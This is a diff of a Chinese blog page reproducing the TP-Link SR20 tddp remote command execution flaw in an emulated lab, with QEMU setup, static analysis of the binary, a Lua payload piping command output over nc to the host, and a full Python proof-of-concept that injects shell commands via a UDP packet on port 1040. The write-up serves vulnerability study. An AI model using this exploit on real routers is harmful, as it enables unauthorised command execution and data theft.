@@ -401,6 +401,13 @@
         
           
             
+  <div class='new-meta-item category'>
+    <a class='notlink'>
+      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
+      <a class="category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+    </a>
+  </div>
+
 
           
         
@@ -436,14 +443,15 @@
 
 
   
-  <p>发布时间：2019年3月26日</p>
+  <p>漏洞公布时间：2019年3月26日</p>
 <h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>参考 <a target="_blank" rel="noopener" href="https://paper.seebug.org/879/#_5">https://paper.seebug.org/879/#_5</a></p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>1、Qemu</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(root权限)</span><br><span class="line">apt install qemu</span><br><span class="line"></span><br><span class="line">root@ubuntu:/home/giantbranch<span class="comment"># qemu-arm --version</span></span><br><span class="line">qemu-arm version <span class="number">2.5</span><span class="number">.0</span> (Debian <span class="number">1</span>:<span class="number">2.5</span>+dfsg<span class="number">-5</span>ubuntu10<span class="number">.51</span>), Copyright (c) <span class="number">2003</span><span class="number">-2008</span> Fabrice Bellard</span><br></pre></td></tr></table></figure>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>1、ubuntu 16.04</p>
+<p>2、Qemu 2.5.0</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wget https://download.qemu.org/qemu<span class="number">-3.1</span><span class="number">.0</span>.tar.xz --no-check-certificate</span><br><span class="line">tar -xvJf qemu<span class="number">-3.1</span><span class="number">.0</span>.tar.xz</span><br><span class="line">cd qemu<span class="number">-3.1</span><span class="number">.0</span>/</span><br><span class="line">./configure --target-list=arm-softmmu --audio-drv-list=alsa,pa</span><br><span class="line">[出现错误：alsa check failed，暂时未解决，故此方法搁置。]</span><br><span class="line"></span><br><span class="line">apt-get install qemu</span><br><span class="line"></span><br><span class="line">root@ubuntu:/home/giantbranch<span class="comment"># qemu-arm --version</span></span><br><span class="line">qemu-arm version <span class="number">2.5</span><span class="number">.0</span> (Debian <span class="number">1</span>:<span class="number">2.5</span>+dfsg<span class="number">-5</span>ubuntu10<span class="number">.51</span>), Copyright (c) <span class="number">2003</span><span class="number">-2008</span> Fabrice Bellard</span><br></pre></td></tr></table></figure>
 
 
 
-<p>2、Binwalk</p>
+<p>3、Binwalk</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/ReFirmLabs/binwalk</span><br><span class="line">cd binwalk</span><br><span class="line">python setup.py install</span><br><span class="line">sudo ./deps.sh $ Debian/Ubuntu</span><br></pre></td></tr></table></figure>
 
 
@@ -454,31 +462,116 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me tpra_sr20v1_us-up-ver1<span class="number">-2</span><span class="number">-4</span>-P123\[<span class="number">20191212</span>-rel55239\]_2019<span class="number">-12</span><span class="number">-12</span>_16<span class="number">.21</span><span class="number">.36</span>.bin</span><br></pre></td></tr></table></figure>
 
 <p>得到sashes-root，就是固件的文件系统。</p>
-<p>找到tddp文件，qemu运行</p>
-<p>尝试启动<code>qemu-arm -L . ./usr/bin/tddp</code>，没有任何反应。</p>
-<p>按照文章教程，完整搭建ARM QEMU虚拟机环境。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt install uml-utilities	<span class="comment">#安装tunctl</span></span><br><span class="line">...</span><br><span class="line">qemu-system-arm -M vexpress-a9 -kernel vmlinuz<span class="number">-3.2</span><span class="number">.0</span><span class="number">-4</span>-vexpress -initrd initrd.img<span class="number">-3.2</span><span class="number">.0</span><span class="number">-4</span>-vexpress -drive <span class="keyword">if</span>=sd,file=debian_wheezy_armhf_standard.qcow2 -append <span class="string">&quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot;</span> -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</span><br></pre></td></tr></table></figure>
+<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><p>1、相关环境（按照文章教程，完整搭建ARM QEMU虚拟机环境。）</p>
+<p>将如下三个文件放在同一个文件中</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">debian_wheezy_armhf_standard.qcow2</span><br><span class="line">initrd.img<span class="number">-3.2</span><span class="number">.0</span><span class="number">-4</span>-vexpress</span><br><span class="line">vmlinuz<span class="number">-3.2</span><span class="number">.0</span><span class="number">-4</span>-vexpress</span><br></pre></td></tr></table></figure>
+
+<p>执行 如下命令</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt install uml-utilities</span><br><span class="line">tunctl -t tap0 -u `whoami`</span><br><span class="line">sudo ifconfig tap0 <span class="number">10.10</span><span class="number">.10</span><span class="number">.1</span>/<span class="number">24</span></span><br><span class="line">qemu-system-arm -M vexpress-a9 -kernel vmlinuz<span class="number">-3.2</span><span class="number">.0</span><span class="number">-4</span>-vexpress -initrd initrd.img<span class="number">-3.2</span><span class="number">.0</span><span class="number">-4</span>-vexpress -drive <span class="keyword">if</span>=sd,file=debian_wheezy_armhf_standard.qcow2 -append <span class="string">&quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot;</span> -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</span><br></pre></td></tr></table></figure>
 
 <p>登陆：root/root</p>
+<p>ubuntu配置网卡IP：ifconfig eth0 10.10.10.2/24</p>
 <p>使用SimpleHTTPServer传递固件</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xjf squashfs-root.tar.bz2</span><br></pre></td></tr></table></figure>
+<p>使用chroot切换根目录固件文件系统</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mount -o bind /dev ./H*-TP-Link_SR20/dev/</span><br><span class="line">mount -t proc /proc/ ./H4lo-TP-Link_SR20/proc/</span><br><span class="line">chroot H*-TP-Link_SR20 sh</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2021/04/26/TPlinkSR20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/fig2arm.jpg" class="lazyload" data-srcset="/2021/04/26/TPlinkSR20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/fig2arm.jpg" srcset="data:image/png;base64,666" alt="fig2arm"></p>
-<p>atftpd</p>
+<p>在宿主机安装 atftpd 搭建 TFTP 服务</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt install atftpd</span><br><span class="line">编辑/etc/default/atftpd文件 【具体见参考文章】</span><br><span class="line">sudo systemctl start atftpd</span><br><span class="line">sudo systemctl status atftpd</span><br></pre></td></tr></table></figure>
+
 <p><img src="/2021/04/26/TPlinkSR20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/fig3atftpd.jpg" class="lazyload" data-srcset="/2021/04/26/TPlinkSR20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/fig3atftpd.jpg" srcset="data:image/png;base64,666" alt="fig3atftpd"></p>
-<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><p>1、qemu虚拟机中启动tddp程序</p>
+<p>2、根目录创建/tftpboot文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tftpboot</span><br><span class="line">chmod <span class="number">777</span> /tftpboot/</span><br><span class="line">cd /tftpboot</span><br><span class="line">touch payload</span><br></pre></td></tr></table></figure>
+
+<p>payload写入如下内容</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function config_test(config)</span><br><span class="line">  os.execute(<span class="string">&quot;id | nc 10.10.10.1 1337&quot;</span>)</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
+
+
+
+<p>3、qemu虚拟机中启动tddp程序</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -L . .&#x2F;usr&#x2F;bin&#x2F;tddp</span><br></pre></td></tr></table></figure>
 
-<p>执行这个没反应，直接./tddp也没反应。</p>
-<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>32位打开！</p>
+<p>执行这个没反应，直接./tddp也没反应。后来发现，是第一个点需要变成./ 就能成功。</p>
+<p>进入别人发我的H*-TP-Link_SR20文件夹，执行以下任意一条即可启动tddp。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./qemu-arm-static -L ./ ./usr/bin/tddp</span><br><span class="line">qemu-arm -L ./ ./usr/bin/tddp</span><br></pre></td></tr></table></figure>
+
+
+
+<p>但是此时是在qemu中的，所以直接./即可执行</p>
+<p><img src="/2021/04/26/TPlinkSR20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/fig9-tddp.jpg" class="lazyload" data-srcset="/2021/04/26/TPlinkSR20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/fig9-tddp.jpg" srcset="data:image/png;base64,666" alt="fig9-tddp"></p>
+<p>4、宿主NC监听，且宿主执行POC</p>
+<p>结果如下：</p>
+<p><img src="/2021/04/26/TPlinkSR20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/fig10-res.png" class="lazyload" data-srcset="/2021/04/26/TPlinkSR20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/fig10-res.png" srcset="data:image/png;base64,666" alt="fig10-res"></p>
+<p>有错误，是在调用Lua API的时候出错了，我太菜了不懂原理，先不用这种了，用另一种方法。</p>
+<p>1、虚拟机root用户</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tunctl -t tap0 -u `whoami`</span><br><span class="line">sudo ifconfig tap0 <span class="number">10.10</span><span class="number">.10</span><span class="number">.1</span>/<span class="number">24</span></span><br><span class="line">qemu-system-arm -M vexpress-a9 -kernel vmlinuz<span class="number">-3.2</span><span class="number">.0</span><span class="number">-4</span>-vexpress -initrd initrd.img<span class="number">-3.2</span><span class="number">.0</span><span class="number">-4</span>-vexpress -drive <span class="keyword">if</span>=sd,file=debian_wheezy_armhf_standard.qcow2 -append <span class="string">&quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot;</span> -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</span><br></pre></td></tr></table></figure>
+
+<p>登陆：root/root</p>
+<p>qemu配置网卡IP：ifconfig eth0 10.10.10.2/24</p>
+<p>使用chroot切换根目录固件文件系统</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mount -o bind /dev ./H4lo-TP-Link_SR20/dev/</span><br><span class="line">mount -t proc /proc/ ./H4lo-TP-Link_SR20/proc/</span><br><span class="line">chroot H4lo-TP-Link_SR20 sh</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在宿主机查看atftpd 状态</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl status atftpd</span><br></pre></td></tr></table></figure>
+
+
+
+<p>2、qemu虚拟机中启动tddp程序</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./usr/bin/tddp</span><br></pre></td></tr></table></figure>
+
+
+
+<p>3、虚拟机nmap扫描</p>
+<p>最开始扫描不出来，后来发现，我上面的ip设置的是10.10.10.2，扫描的时候写的ip是10.0.0.2……</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p <span class="number">1040</span> -sU <span class="number">10.10</span><span class="number">.10</span><span class="number">.2</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/04/26/TPlinkSR20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/fig11-nmap.jpg" class="lazyload" data-srcset="/2021/04/26/TPlinkSR20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/fig11-nmap.jpg" srcset="data:image/png;base64,666" alt="fig11-nmap"></p>
+<p>4、运行exp</p>
+<p>虚拟机运行：<code>python exp.py 10.10.10.2 date</code></p>
+<p>出现如下错误</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/giantbranch/CVE/TPlinkSR20<span class="comment"># python exp.py 10.10.10.2 date</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;exp.py&quot;</span>, line <span class="number">15</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    payload = <span class="string">&#x27;x01x31&#x27;</span>.ljust(<span class="number">12</span>,<span class="string">&#x27;x00&#x27;</span>)</span><br><span class="line">TypeError: ljust() argument <span class="number">2</span> must be char, <span class="keyword">not</span> str</span><br></pre></td></tr></table></figure>
+
+<p>这是因为别的大佬在发布文章的时候，反斜杠 \ 这个字符被网页过滤了，再加上就好。payload如下：</p>
+<p><img src="/2021/04/26/TPlinkSR20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/fig12-payload.jpg" class="lazyload" data-srcset="/2021/04/26/TPlinkSR20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/fig12-payload.jpg" srcset="data:image/png;base64,666" alt="fig12-payload"></p>
+<p>命令成功执行结果如下：</p>
+<p><img src="/2021/04/26/TPlinkSR20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/fig13-res_date.jpg" class="lazyload" data-srcset="/2021/04/26/TPlinkSR20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/fig13-res_date.jpg" srcset="data:image/png;base64,666" alt="fig13-res_date"></p>
+<p>5、NC回显结果</p>
+<p>宿主机监听7890端口：<code>nc -nvl 10.10.10.1 7890</code></p>
+<p>qemu打开tddp：<code>./usr/bin/tddp</code></p>
+<p>宿主机执行exp：<code>python exp.py 10.10.10.2 &quot;ifconfig|nc 10.10.10.1 7890&quot;</code></p>
+<p>结果如下<img src="/2021/04/26/TPlinkSR20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/fig14-res-nc.jpg" class="lazyload" data-srcset="/2021/04/26/TPlinkSR20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/fig14-res-nc.jpg" srcset="data:image/png;base64,666" alt="fig14-res-nc"></p>
+<p>右下角输出的是命令ifconfig的内容。</p>
+<p>poc如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">tddp_port = <span class="number">1040</span></span><br><span class="line">recv_port = <span class="number">12345</span></span><br><span class="line">ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">command = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">s_send = socket(AF_INET,SOCK_DGRAM,<span class="number">0</span>)</span><br><span class="line">s_recv = socket(AF_INET,SOCK_DGRAM,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">s_recv.bind((<span class="string">&#x27;&#x27;</span>,<span class="number">12345</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;\x01\x31&#x27;</span>.ljust(<span class="number">12</span>,<span class="string">&#x27;\x00&#x27;</span>)	<span class="comment">#01表示版本号，31是用来触发漏洞的，12是用来填充的，需要后面填充12个字符。</span></span><br><span class="line">payload += <span class="string">&quot;123|%s&amp;&amp;echo ;123&quot;</span>%(command) <span class="comment">#；是用来分割的，后面的123是为了让分割之后后半部分不为空，可以看成是填充的。</span></span><br><span class="line"></span><br><span class="line">s_send.sendto(payload,(ip,tddp_port))</span><br><span class="line">s_send.close()</span><br><span class="line"></span><br><span class="line">res,addr = s_recv.recvfrom(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> res</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>32位打开tddp文件，参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43815930/article/details/107601747%EF%BC%8C%E5%85%88%E4%BB%8Erecvfrom%E5%87%BD%E6%95%B0%E5%BC%80%E5%A7%8B%E3%80%82%E5%8F%91%E7%8E%B0sub_16418%E8%B0%83%E7%94%A8%E4%BA%86%E8%BF%99%E4%B8%AA%E5%87%BD%E6%95%B0%E3%80%82%E8%B0%83%E7%94%A8%E8%AF%AD%E5%8F%A5%E5%A6%82%E4%B8%8B%EF%BC%9A">https://blog.csdn.net/weixin_43815930/article/details/107601747，先从recvfrom函数开始。发现sub_16418调用了这个函数。调用语句如下：</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v14 = recvfrom(a1[<span class="number">9</span>], (char *)a1 + <span class="number">45083</span>, <span class="number">0xAFC8</span>u, <span class="number">0</span>, &amp;addr, &amp;addr_len);</span><br></pre></td></tr></table></figure>
+
+<p>下面还有判断协议版本的</p>
+<p><img src="/2021/04/26/TPlinkSR20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/fig4.jpg" class="lazyload" data-srcset="/2021/04/26/TPlinkSR20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/fig4.jpg" srcset="data:image/png;base64,666" alt="fig4"></p>
+<p>sub_936c调用了sub_16418，查看sub_936c内容如下，根据其输出内容以及setsockopt函数，判断其为主函数。</p>
+<p><img src="/2021/04/26/TPlinkSR20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/fig5.jpg" class="lazyload" data-srcset="/2021/04/26/TPlinkSR20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/fig5.jpg" srcset="data:image/png;base64,666" alt="fig5"></p>
+<p>刚才的sub_16418函数的recvfrom下面调用了sub_15E74函数。它会对传入的多个值进行比较，根据前置知识，知道了漏洞出现在case 0x31的位置。</p>
+<p><img src="/2021/04/26/TPlinkSR20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/fig6-0x31.jpg" class="lazyload" data-srcset="/2021/04/26/TPlinkSR20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/fig6-0x31.jpg" srcset="data:image/png;base64,666" alt="fig6-0x31"></p>
+<p>跟随其进入sub_A580处。</p>
+<p><img src="/2021/04/26/TPlinkSR20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/fig7-scanf.jpg" class="lazyload" data-srcset="/2021/04/26/TPlinkSR20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/fig7-scanf.jpg" srcset="data:image/png;base64,666" alt="fig7-scanf"></p>
+<p>随后有语句<code>v16 = inet_ntoa(*(struct in_addr *)(a1 + 4));</code>将传入的内容变成IP地址的格式，</p>
+<p>随后调用sub_91DC函数。这里的cd /tmp很可疑，可能会存在指令注入。</p>
+<p><img src="/2021/04/26/TPlinkSR20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/fig8-cmd.jpg" class="lazyload" data-srcset="/2021/04/26/TPlinkSR20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/fig8-cmd.jpg" srcset="data:image/png;base64,666" alt="fig8-cmd"></p>
+<p>漏洞就是在这个tftp位置处。<code>如果我们在我们的攻击机上配置一个atftp服务，并且向TP-Link SR20的1040端口传输一个第二个字节数据为0x31的tddp数据包，那这个路由器就会从我们的攻击机上下载文件。</code></p>
+<p><a target="_blank" rel="noopener" href="https://x1ng.top/2020/10/18/TP-Link-sr20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">这篇文章</a> 先从cmd开始找起，也是可以的。</p>
+<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><p>1、socket接收的内容是我们可控的</p>
+<p>2、传输的时候第一个字节代表的应该是版本号，一般设定的都是1。设定为1，参数后移12位；如果设定成其他的，参数后移28位。</p>
 <p>参考：</p>
-<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/879/#_5">https://paper.seebug.org/879/#_5</a></p>
-<p>没成功，需要参考的文章：</p>
-<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/93020741">https://zhuanlan.zhihu.com/p/93020741</a></p>
-<p><a target="_blank" rel="noopener" href="https://x1ng.top/2020/10/18/TP-Link-sr20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">https://x1ng.top/2020/10/18/TP-Link-sr20远程命令执行/</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43815930/article/details/107601747">https://blog.csdn.net/weixin_43815930/article/details/107601747</a></p>
-<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/879/">https://paper.seebug.org/879/</a></p>
-<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/879/#_3">https://paper.seebug.org/879/#_3</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43815930">静态分析-CSDN-byAnansi_safe</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/879/#_5">完整分析-seebug-by知道创宇xax007</a></p>
+<p><a target="_blank" rel="noopener" href="https://x1ng.top/2020/10/18/TP-Link-sr20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">完整分析-个人博客-byX1ng</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/183202">完整分析-安全客-byH4lo</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/84991">一个更高层面的分析-by国外研究员</a></p>
 
   
   
@@ -513,10 +606,10 @@
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-05-29T11:20:39+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-07-27T16:24:18+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：May 29, 2021</p>
+    <p>更新于：Jul 27, 2021</p>
   </a>
 </div>
 
@@ -642,7 +735,7 @@ Compromised or Attacker-Owned: A Large Scale Classification and Study ofHo...</p
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BA%E4%BB%B6"><span class="toc-text">固件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E6%AD%A5%E9%AA%A4"><span class="toc-text">复现步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-text">静态分析</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BA%E4%BB%B6"><span class="toc-text">固件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E6%AD%A5%E9%AA%A4"><span class="toc-text">复现步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-text">静态分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%B6%E8%8E%B7"><span class="toc-text">收获</span></a></li></ol>
     </div>
   </section>
 
